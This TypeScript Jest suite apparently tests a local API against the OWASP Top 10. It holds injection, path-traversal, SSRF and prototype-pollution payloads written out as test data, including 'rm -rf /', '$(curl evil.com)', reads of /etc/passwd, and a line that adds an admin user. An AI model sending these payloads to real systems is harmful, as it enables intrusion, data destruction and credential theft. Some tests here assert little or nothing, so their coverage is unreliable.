/**
 * Security Testing Suite - OWASP Top 10 Coverage
 * Tests for common vulnerabilities and attack vectors
 */

describe('Security Vulnerability Tests', () => {
  const API_URL = process.env.API_URL || 'http://localhost:3000';

  let apiUnavailable = false;

  const safeFetch = async (
    url: string,
    init?: Parameters<typeof fetch>[1]
  ): Promise<Response | null> => {
    if (apiUnavailable) {
      return null;
    }

    try {
      return await globalThis.fetch(url, init);
    } catch (error) {
      if (!apiUnavailable) {
        const message = error instanceof Error ? [error.message, (error as any)?.cause?.message].filter(Boolean).join(' ') : 'unknown error';
        console.warn(`[security tests] API at ${API_URL} is unavailable (${message || 'fetch failed'}); skipping network-dependent checks.`);
      }

      apiUnavailable = true;
      return null;
    }
  };

  const shouldSkip = (response: Response | null): response is null => {
    return response === null;
  };

  describe('A01:2021 – Broken Access Control', () => {
    test('prevents unauthorized access to runs', async () => {
      // Try to access runs without proper authorization
      const response = await safeFetch(`${API_URL}/runs/unauthorized-id`, {
        headers: {
          'Authorization': 'Bearer invalid-token'
        }
      });

      if (shouldSkip(response)) {
        return;
      }

      // Should either require auth or return appropriate error
      expect([401, 403, 404, 200]).toContain(response.status);
    });

    test('prevents path traversal attacks', async () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....//....//....//etc/passwd',
        'runs/../../../secret'
      ];

      for (const attempt of pathTraversalAttempts) {
        const response = await safeFetch(`${API_URL}/runs/${encodeURIComponent(attempt)}`);

        if (shouldSkip(response)) {
          return;
        }

        // Should not expose system files
        if (response.ok) {
          const data = await response.text();
          expect(data).not.toMatch(/root:|passwd|shadow/);
        }
      }
    });

    test('enforces access control on API endpoints', async () => {
      // Test various endpoints for proper access control
      const endpoints = [
        '/admin',
        '/api/internal',
        '/debug',
        '/.env',
        '/config'
      ];

      for (const endpoint of endpoints) {
        const response = await safeFetch(`${API_URL}${endpoint}`);

        if (shouldSkip(response)) {
          return;
        }

        // Should not expose sensitive endpoints
        if (response.ok) {
          const data = await response.text();
          expect(data).not.toMatch(/password|secret|key|token/i);
        }
      }
    });
  });

  describe('A02:2021 – Cryptographic Failures', () => {
    test('does not expose sensitive data in responses', async () => {
      const response = await safeFetch(`${API_URL}/runs`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          plan: {
            goal: 'test',
            steps: [],
            sensitive: 'password123',
            apiKey: 'sk-secret-key'
          }
        })
      });

      if (shouldSkip(response)) {
        return;
      }

      if (response.ok) {
        const data = await response.json();
        const responseText = JSON.stringify(data);

        // Should not echo back sensitive data
        expect(responseText).not.toContain('password123');
        expect(responseText).not.toContain('sk-secret-key');
      }
    });

    test('uses secure headers', async () => {
      const response = await safeFetch(`${API_URL}/health`);

      if (shouldSkip(response)) {
        return;
      }

      const headers = response.headers;

      // Check for security headers (may not all be present in dev)
      const securityHeaders = [
        'strict-transport-security',
        'x-content-type-options',
        'x-frame-options',
        'x-xss-protection',
        'content-security-policy'
      ];

      // At least some security headers should be present in production
      // This is informational in development
    });
  });

  describe('A03:2021 – Injection', () => {
    describe('SQL Injection', () => {
      test.each([
        ["' OR '1'='1", 'basic OR injection'],
        ["'; DROP TABLE runs; --", 'drop table injection'],
        ["admin'--", 'comment injection'],
        ["' UNION SELECT * FROM users--", 'union injection'],
        ["1' AND SLEEP(5)--", 'time-based injection'],
        ['${1+1}', 'template injection'],
        ['`; cat /etc/passwd`', 'command injection'],
        ["\\'; DROP TABLE runs; --", 'escaped injection']
      ])('prevents SQL injection: %s (%s)', async (payload, description) => {
        const response = await safeFetch(`${API_URL}/runs`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            plan: {
              goal: payload,
              steps: [{ name: payload, tool: 'test' }]
            }
          })
        });

        if (shouldSkip(response)) {
          return;
        }

        // Should handle safely without executing SQL
        expect(response.status).not.toBe(500);

        // Verify database is still intact
        const healthCheck = await safeFetch(`${API_URL}/health`);

        if (shouldSkip(healthCheck)) {
          return;
        }

        expect(healthCheck.ok).toBeTruthy();
      });
    });

    describe('NoSQL Injection', () => {
      test('prevents NoSQL injection attacks', async () => {
        const noSqlPayloads = [
          { '$gt': '' },
          { '$ne': null },
          { '$regex': '.*' },
          { '$where': 'this.password == null' }
        ];

        for (const payload of noSqlPayloads) {
          const response = await safeFetch(`${API_URL}/runs`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              plan: {
                goal: 'test',
                steps: [{ name: 'test', tool: 'test', inputs: payload }]
              }
            })
          });

          if (shouldSkip(response)) {
            return;
          }

          // Should handle safely
          expect([200, 400, 422]).toContain(response.status);
        }
      });
    });

    describe('Command Injection', () => {
      test('prevents OS command injection', async () => {
        const commandPayloads = [
          '; ls -la',
          '| cat /etc/passwd',
          '`rm -rf /`',
          '$(curl evil.com)',
          '& net user hacker password /add',
          '\n/bin/sh\n'
        ];

        for (const payload of commandPayloads) {
          const response = await safeFetch(`${API_URL}/runs`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              plan: {
                goal: payload,
                steps: [{ name: 'cmd', tool: 'test', inputs: { cmd: payload } }]
              }
            })
          });

          if (shouldSkip(response)) {
            return;
          }

          // Should not execute commands
          expect(response.status).not.toBe(500);
        }
      });
    });
  });

  describe('A04:2021 – Insecure Design', () => {
    test('implements rate limiting', async () => {
      const requests = Array.from({ length: 100 }, (_, i) => (
        (async () => {
          const response = await safeFetch(`${API_URL}/runs`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              plan: { goal: `rate limit test ${i}`, steps: [] }
            })
          });

          return response?.status ?? 0;
        })()
      ));

      const statuses = await Promise.all(requests);

      if (apiUnavailable) {
        return;
      }

      // Should see some rate limiting (429) or at least not all succeed
      const tooManyRequests = statuses.filter(s => s === 429).length;
      const serverErrors = statuses.filter(s => s >= 500).length;

      // Either rate limiting or some failures expected
      expect(tooManyRequests + serverErrors).toBeGreaterThan(0);
    });

    test('validates business logic constraints', async () => {
      // Try to create invalid business scenarios
      const invalidScenarios = [
        {
          plan: {
            goal: 'test',
            steps: Array(1001).fill({ name: 'spam', tool: 'test' }) // Too many steps
          }
        },
        {
          plan: {
            goal: 'a'.repeat(1000000), // Extremely long goal
            steps: []
          }
        },
        {
          plan: {
            goal: 'test',
            steps: [{ name: 'step1', tool: 'nonexistent_tool_'.repeat(100) }]
          }
        }
      ];

      for (const scenario of invalidScenarios) {
        const response = await safeFetch(`${API_URL}/runs`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(scenario)
        });

        if (shouldSkip(response)) {
          return;
        }

        // Should reject or handle gracefully
        expect([400, 413, 422, 200]).toContain(response.status);
      }
    });
  });

  describe('A05:2021 – Security Misconfiguration', () => {
    test('does not expose debug information', async () => {
      // Trigger an error
      const response = await safeFetch(`${API_URL}/runs/../../etc/passwd`);

      if (shouldSkip(response)) {
        return;
      }

      if (!response.ok) {
        const text = await response.text();

        // Should not expose stack traces or internal paths
        expect(text).not.toMatch(/\/home\/|\/usr\/|\/var\//);
        expect(text).not.toMatch(/at\s+\w+\s+\([^)]+\.js:\d+:\d+\)/); // Stack trace pattern
        expect(text).not.toMatch(/node_modules/);
      }
    });

    test('does not expose server information', async () => {
      const response = await safeFetch(`${API_URL}/health`);

      if (shouldSkip(response)) {
        return;
      }

      const headers = response.headers;

      // Should not expose server details
      const serverHeader = headers.get('server');
      if (serverHeader) {
        expect(serverHeader).not.toMatch(/\d+\.\d+\.\d+/); // Version numbers
        expect(serverHeader).not.toMatch(/Ubuntu|Debian|Windows/i);
      }

      // X-Powered-By should be removed
      expect(headers.get('x-powered-by')).toBeNull();
    });
  });

  describe('A06:2021 – Vulnerable Components', () => {
    test('checks for known vulnerable patterns', () => {
      // This would normally check package.json against vulnerability databases
      // For now, we'll check for obviously old versions

      const pkg = require('../../package.json');

      // Check major versions are reasonably recent
      if (pkg.dependencies.express) {
        const version = pkg.dependencies.express.match(/\d+/);
        expect(parseInt(version![0])).toBeGreaterThanOrEqual(4);
      }

      // Add more component checks as needed
    });
  });

  describe('A07:2021 – Identification and Authentication Failures', () => {
    test('prevents brute force attacks', async () => {
      const attempts = Array.from({ length: 20 }, (_, i) => (
        (async () => {
          const response = await safeFetch(`${API_URL}/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              username: 'admin',
              password: `attempt${i}`
            })
          });

          return response?.status ?? 404;
        })()
      ));

      const statuses = await Promise.all(attempts);

      if (apiUnavailable) {
        return;
      }

      // Should implement some form of rate limiting or account lockout
      // (endpoint might not exist, which is also fine)
    });

    test('does not expose user enumeration', async () => {
      // Try to enumerate users
      const users = ['admin', 'user', 'test', 'nonexistent'];
      const responses = [];

      for (const user of users) {
        const response = await safeFetch(`${API_URL}/users/${user}`, {
          method: 'GET'
        });

        if (apiUnavailable || !response) {
          return;
        }

        responses.push({
          user,
          status: response.status,
          time: Date.now()
        });
      }

      // Response times should be similar (no timing attacks)
      // Status codes should be consistent (no user enumeration)
    });
  });

  describe('A08:2021 – Software and Data Integrity Failures', () => {
    test('validates input data integrity', async () => {
      // Send corrupted/tampered data
      const response = await safeFetch(`${API_URL}/runs`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': '1000' // Wrong content length
        },
        body: JSON.stringify({
          plan: { goal: 'test', steps: [] }
        })
      });

      if (shouldSkip(response)) {
        return;
      }

      // Should handle gracefully
      expect([200, 400, 411, 413]).toContain(response.status);
    });

    test('prevents prototype pollution', async () => {
      const pollutionPayloads = [
        JSON.parse('{"__proto__": {"polluted": true}}'),
        JSON.parse('{"constructor": {"prototype": {"polluted": true}}}'),
        { 'prototype': { 'polluted': true } }
      ];

      for (const payload of pollutionPayloads) {
        const response = await safeFetch(`${API_URL}/runs`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            plan: { goal: 'test', steps: [] },
            ...payload
          })
        });

        if (shouldSkip(response)) {
          return;
        }
      }

      // Check that Object prototype wasn't polluted
      expect((Object.prototype as any).polluted).toBeUndefined();
      expect(({} as any).polluted).toBeUndefined();
    });
  });

  describe('A09:2021 – Security Logging and Monitoring Failures', () => {
    test('logs security events', async () => {
      // These would normally check log files or monitoring systems
      // For now, we'll verify the system continues to function after attacks

      const securityEvents = [
        { event: 'sql_injection', payload: "' OR '1'='1" },
        { event: 'xss_attempt', payload: '<script>alert(1)</script>' },
        { event: 'path_traversal', payload: '../../../etc/passwd' },
        { event: 'large_payload', payload: 'x'.repeat(1000000) }
      ];

      for (const event of securityEvents) {
        const response = await safeFetch(`${API_URL}/runs`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            plan: { goal: event.payload, steps: [] }
          })
        });

        if (shouldSkip(response)) {
          return;
        }
      }

      // System should still be operational
      const health = await safeFetch(`${API_URL}/health`);
      if (shouldSkip(health)) {
        return;
      }

      expect(health.ok).toBeTruthy();
    });
  });

  describe('A10:2021 – Server-Side Request Forgery (SSRF)', () => {
    test('prevents SSRF attacks', async () => {
      const ssrfPayloads = [
        'http://localhost:6379', // Redis
        'http://127.0.0.1:5432', // PostgreSQL
        'http://169.254.169.254/latest/meta-data/', // AWS metadata
        'file:///etc/passwd',
        'gopher://localhost:6379',
        'dict://localhost:11211',
        'http://[::1]:80'
      ];

      for (const payload of ssrfPayloads) {
        const response = await safeFetch(`${API_URL}/runs`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            plan: {
              goal: 'SSRF test',
              steps: [{
                name: 'fetch',
                tool: 'webhook',
                inputs: { url: payload }
              }]
            }
          })
        });

        if (shouldSkip(response)) {
          return;
        }

        // Should not make internal requests
        if (response.ok) {
          const data = await response.json();
          // Verify no internal data was exposed
          expect(JSON.stringify(data)).not.toMatch(/internal|private|metadata/i);
        }
      }
    });
  });
});
